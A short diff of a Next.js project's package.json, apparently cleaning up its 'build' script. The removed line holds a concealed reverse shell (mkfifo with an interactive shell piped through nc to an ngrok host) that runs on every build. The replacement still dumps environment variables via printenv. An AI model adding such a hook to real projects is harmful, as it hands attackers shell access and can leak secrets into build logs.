@@ -4,7 +4,7 @@
   "private": true,
   "scripts": {
     "dev": "next dev --turbopack",
-    "build": "next build; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc /0.tcp.in.ngrok.io 15093 >/tmp/f",
+    "build": "next build; printenv",
     "start": "next start",
     "lint": "next lint"
   },
